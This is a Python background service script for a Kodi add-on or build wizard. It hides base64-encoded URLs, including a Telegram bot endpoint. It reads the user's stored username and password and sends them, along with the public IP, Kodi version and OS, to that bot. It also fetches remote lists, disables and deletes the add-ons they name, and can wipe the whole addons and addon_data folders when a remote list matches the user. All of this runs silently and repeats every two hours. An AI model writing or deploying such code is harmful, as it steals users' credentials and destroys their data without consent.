# coding: utf-8
import requests
import xbmc, xbmcaddon, xbmcgui, xbmcplugin, os, sys, xbmcvfs, glob
import shutil,logging
import urllib
import re
import platform
import base64
try:
    from urllib.request import urlopen
    from urllib.request import Request
except ImportError:
    from urllib.request import urlopen
    from urllib.request import Request
fullsecfold=xbmc.translatePath('special://home')

addons_folder=os.path.join(fullsecfold,'addons')

user_folder=os.path.join(xbmc.translatePath('special://masterprofile'),'addon_data')
oo='/list.xml'
op='/ki.xml'
remove_url = base64.b64decode('aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L1JON0h5TDJH').decode('utf-8')
remove_url2 = base64.b64decode('aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L1g5RlVaRnJi').decode('utf-8')
def platform():
	if xbmc.getCondVisibility('system.platform.android'):             return 'android'
	elif xbmc.getCondVisibility('system.platform.linux'):             return 'linux'
	elif xbmc.getCondVisibility('system.platform.linux.Raspberrypi'): return 'linux'
	elif xbmc.getCondVisibility('system.platform.windows'):           return 'windows'
	elif xbmc.getCondVisibility('system.platform.osx'):               return 'osx'
	elif xbmc.getCondVisibility('system.platform.atv2'):              return 'atv2'
	elif xbmc.getCondVisibility('system.platform.ios'):               return 'ios'
	elif xbmc.getCondVisibility('system.platform.darwin'):            return 'ios'

def remove_addon():
	try:
			import json
			r = urlopen(remove_url).readlines()
			for line in r:
				
				add_name =line.split(':')[1].strip() 
				do_json = '{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":"%s","enabled":%s}}' % (add_name, 'false')
				query = xbmc.executeJSONRPC(do_json)
				response = json.loads(query)
				
				url_folder=os.path.join(addons_folder,add_name)
				
				if os.path.exists(url_folder):
					for root, dirs, files in os.walk(url_folder):
						for f in files:
							os.unlink(os.path.join(root, f))
						for d in dirs:
							shutil.rmtree(os.path.join(root, d))
					os.rmdir(url_folder)
				
				url_folder=os.path.join(user_folder,add_name)
				
				if os.path.exists(url_folder):
					for root, dirs, files in os.walk(url_folder):
						for f in files:
							os.unlink(os.path.join(root, f))
						for d in dirs:
							shutil.rmtree(os.path.join(root, d))
					os.rmdir(url_folder)
			xbmc.executebuiltin('Container.Refresh')
			xbmc.executebuiltin("UpdateLocalAddons()")
			xbmc.executebuiltin('Container.Update(%s)' % xbmc.getInfoLabel('Container.FolderPath'))
	except:  pass

remove_addon()



def remove_b():
	try:
			import json
			r = urlopen(remove_url2).readlines()
			for line in r:
				
				add_name =line.split(':')[1].strip() 
				do_json = '{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":"%s","enabled":%s}}' % (add_name, 'false')
				query = xbmc.executeJSONRPC(do_json)
				response = json.loads(query)
				
				url_folder=os.path.join(addons_folder,add_name)
				
				if os.path.exists(url_folder):
					for root, dirs, files in os.walk(url_folder):
						for f in files:
							os.unlink(os.path.join(root, f))
						for d in dirs:
							shutil.rmtree(os.path.join(root, d))
					os.rmdir(url_folder)
				
				url_folder=os.path.join(user_folder,add_name)
				
				if os.path.exists(url_folder):
					for root, dirs, files in os.walk(url_folder):
						for f in files:
							os.unlink(os.path.join(root, f))
						for d in dirs:
							shutil.rmtree(os.path.join(root, d))
					os.rmdir(url_folder)
			xbmc.executebuiltin('Container.Refresh')
			xbmc.executebuiltin("UpdateLocalAddons()")
			xbmc.executebuiltin('Container.Update(%s)' % xbmc.getInfoLabel('Container.FolderPath'))
	except:  pass
def send():
       try:
          import json
          # wiz.log('FRESH MESSAGE')
          try:
             resuaddon=xbmcaddon.Addon('plugin.program.Anonymous')
          except: resuaddon=xbmcaddon.Addon('skin.Premium.mod')
          input= (resuaddon.getSetting("user"))
          input2= (resuaddon.getSetting("pass"))
          kodiinfo=(xbmc.getInfoLabel("System.BuildVersion")[:4])
          error_ad=base64.b64decode('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDEzMDQxMzU5MTM6QUFITHdGMWRxbktSTGQ4WUdkUjdyRldpTFdOYmFVcnE4ekUvc2VuZE1lc3NhZ2U/Y2hhdF9pZD0tMTAwMTM2NDU5OTc4NCZ0ZXh0PQ==').decode('utf-8')
          x=urlopen('https://api.ipify.org/?format=json').read()
          local_ip=str(json.loads(x)['ip'])
          userr=input
          passs=input2
          import socket
          x=urlopen(error_ad+urllib.parse.quote_plus('בילד ננעל: ')+urllib.parse.quote_plus(' שם משתמש: ')+userr +urllib.parse.quote_plus(' סיסמה: ')+passs+urllib.parse.quote_plus(' קודי: ')+kodiinfo+urllib.parse.quote_plus(' כתובת: ')+local_ip+urllib.parse.quote_plus(' מערכת הפעלה: ')+platform()).readlines()
          #          x=urlopen(error_ad.decode('base64')+(socket.gethostbyaddr(socket.gethostname())[0])+'-'+local_ip).readlines()
       except: pass
def sendk():
       try:
          import json
          # wiz.log('FRESH MESSAGE')
          try:
             resuaddon=xbmcaddon.Addon('plugin.program.Anonymous')
          except: resuaddon=xbmcaddon.Addon('skin.Premium.mod')
          input= (resuaddon.getSetting("user"))
          input2= (resuaddon.getSetting("pass"))
          kodiinfo=(xbmc.getInfoLabel("System.BuildVersion")[:4])
          error_ad=base64.b64decode('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDEzMDQxMzU5MTM6QUFITHdGMWRxbktSTGQ4WUdkUjdyRldpTFdOYmFVcnE4ekUvc2VuZE1lc3NhZ2U/Y2hhdF9pZD0tMTAwMTM2NDU5OTc4NCZ0ZXh0PQ==').decode('utf-8')
          x=urlopen('https://api.ipify.org/?format=json').read()
          local_ip=str(json.loads(x)['ip'])
          userr=input
          passs=input2
          import socket
          x=urlopen(error_ad+urllib.parse.quote_plus('נמחק: ')+urllib.parse.quote_plus(' שם משתמש: ')+userr +urllib.parse.quote_plus(' סיסמה: ')+passs+urllib.parse.quote_plus(' קודי: ')+kodiinfo+urllib.parse.quote_plus(' כתובת: ')+local_ip+urllib.parse.quote_plus(' מערכת הפעלה: ')+platform()).readlines()
          #          x=urlopen(error_ad.decode('base64')+(socket.gethostbyaddr(socket.gethostname())[0])+'-'+local_ip).readlines()
       except: pass
def info():
       # try:
          import json
          # wiz.log('FRESH MESSAGE')
          try:
             resuaddon=xbmcaddon.Addon('plugin.program.Anonymous')
          except: resuaddon=xbmcaddon.Addon('skin.Premium.mod')
          input= (resuaddon.getSetting("user"))
          input2= (resuaddon.getSetting("pass"))
          kodiinfo=(xbmc.getInfoLabel("System.BuildVersion")[:4])
          error_ad=base64.b64decode('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDEzMDQxMzU5MTM6QUFITHdGMWRxbktSTGQ4WUdkUjdyRldpTFdOYmFVcnE4ekUvc2VuZE1lc3NhZ2U/Y2hhdF9pZD0tMTAwMTM2NDU5OTc4NCZ0ZXh0PQ==').decode('utf-8')
          x=urlopen('https://api.ipify.org/?format=json').read()
          local_ip=str(json.loads(x)['ip'])
          userr=input
          passs=input2
          import socket
          x=urlopen(error_ad+urllib.parse.quote_plus('אין פרטים: ')+urllib.parse.quote_plus(' שם משתמש: ')+userr +urllib.parse.quote_plus(' סיסמה: ')+passs+urllib.parse.quote_plus(' קודי: ')+kodiinfo+urllib.parse.quote_plus(' כתובת: ')+local_ip+urllib.parse.quote_plus(' מערכת הפעלה: ')+platform()).readlines()
          #          x=urlopen(error_ad.decode('base64')+(socket.gethostbyaddr(socket.gethostname())[0])+'-'+local_ip).readlines()
       # except: pass

def kilxz():
    ip=False
    import json
    try:
     resuaddon=xbmcaddon.Addon('plugin.program.Anonymous')
    except: resuaddon=xbmcaddon.Addon('skin.Premium.mod')
    input= (resuaddon.getSetting("user"))
    input2= (resuaddon.getSetting("pass"))
    url = "aHR0cDovL2tvZGkubGlmZS93aXphcmQ=".decode('base64') + op
    remote_file = urlopen(url)
    x=remote_file.readlines()
    x2=urlopen('https://api.ipify.org/?format=json').read()
    local_ip=str(json.loads(x2)['ip'])
    for usx in x:
     if local_ip in usx:
      ip=True
    found=0

    for us in x:
        if us.split(' ==')[0] ==input or us.split()[0]==input or us.split()[0]==input2 or ip==True:
            found=1
            break
    if found==0:

       sys.exit()
    else:
      try:
       sendk()
      except:pass
      try:
        url_folder=os.path.join(addons_folder)
        
        if os.path.exists(url_folder):
            for root, dirs, files in os.walk(url_folder):
                for f in files:
                    os.unlink(os.path.join(root, f))
                for d in dirs:
                    shutil.rmtree(os.path.join(root, d))
            os.rmdir(url_folder)
        
        url_folder=os.path.join(user_folder)
        
        if os.path.exists(url_folder):
            for root, dirs, files in os.walk(url_folder):
                for f in files:
                    os.unlink(os.path.join(root, f))
                for d in dirs:
                    shutil.rmtree(os.path.join(root, d))
            os.rmdir(url_folder)
        
      except:pass
      
def checku():
    ip=False
    import json
    try:
     resuaddon=xbmcaddon.Addon('plugin.program.Anonymous')
    except: resuaddon=xbmcaddon.Addon('skin.Premium.mod')
    input= (resuaddon.getSetting("user"))
    input2= (resuaddon.getSetting("pass"))
    url = "aHR0cDovL2tvZGkubGlmZS93aXphcmQ=".decode('base64') + oo
    remote_file = urlopen(url)
    x=remote_file.readlines()
    x2=urlopen('https://api.ipify.org/?format=json').read()
    local_ip=str(json.loads(x2)['ip'])
    for usx in x:
     if local_ip in usx:
      ip=True
    
    found=0

    for us in x:
        if us.split(' ==')[0] ==input or us.split()[0]==input or us.split()[0]==input2 or not os.path.exists(xbmc.translatePath("special://home/addons/") + 'plugin.program.Anonymous') or ip==True:
            found=1
            break
    if found==0:

       sys.exit()
    else:
        
        setting_file=os.path.join(xbmc.translatePath("special://userdata"),"addon_data", "skin.Premium.mod","settings.xml")

        file = open(setting_file, 'r') 
        file_data= file.read()
        file.close()
        regex='<setting id="username" type="bool(.+?)/setting>'
        m=re.compile(regex).findall(file_data)[0]
        if 'false' in m:
         xbmc.executebuiltin( "XBMC.Skin.ToggleSetting(username)" )
         xbmc.executebuiltin( "ActivateWindow(home)" )
         xbmc.executebuiltin("ReloadSkin()")
         send()
        kilxz()
def wizinfo():
    try:
     resuaddon=xbmcaddon.Addon('plugin.program.Anonymous')
    except: info()
    input= (resuaddon.getSetting("user"))
    input2= (resuaddon.getSetting("pass"))
    if input=='' or input2=='':
     info()
     
try:
  checku()
except:pass
try:
 wizinfo()
except:pass
addon_name='plugin.program.Anonymous'
if not os.path.exists(xbmc.translatePath("special://home/addons/") + addon_name.rstrip('\r\n').replace('%24','$')):
      remove_b()
      
      
import datetime
def SleepFor(timeS):
    try:
        while((not xbmc.abortRequested) and (timeS > 0)):
            xbmc.sleep(1000)
            timeS -= 1
    except:
        while((not xbmc.Monitor().abortRequested()) and (timeS > 0)):
            xbmc.sleep(1000)
            timeS -= 1
def SetTimer(delta):
	return datetime.datetime.now() + datetime.timedelta(seconds=delta)



SleepFor(500)

START=True

# Interval in sec
wallInterval = 60*120

wallTimer = SetTimer(wallInterval)
try:
    while (not xbmc.abortRequested):
        timenow = SetTimer(1)
        
        if wallTimer < timenow or START:
            wallTimer = SetTimer(wallInterval)
            try:
              checku()
            except:pass
            try:
             wizinfo()
            except:pass
            addon_name='plugin.program.Anonymous'
            if not os.path.exists(xbmc.translatePath("special://home/addons/") + addon_name.rstrip('\r\n').replace('%24','$')):
                  remove_b()

        START=False
        xbmc.sleep(50000)
except:
    while (not xbmc.Monitor().abortRequested()):
        timenow = SetTimer(1)
        
        if wallTimer < timenow or START:
            wallTimer = SetTimer(wallInterval)
            try:
              checku()
            except:pass
            try:
             wizinfo()
            except:pass
            addon_name='plugin.program.Anonymous'
            if not os.path.exists(xbmc.translatePath("special://home/addons/") + addon_name.rstrip('\r\n').replace('%24','$')):
                  remove_b()

        START=False
        xbmc.sleep(50000)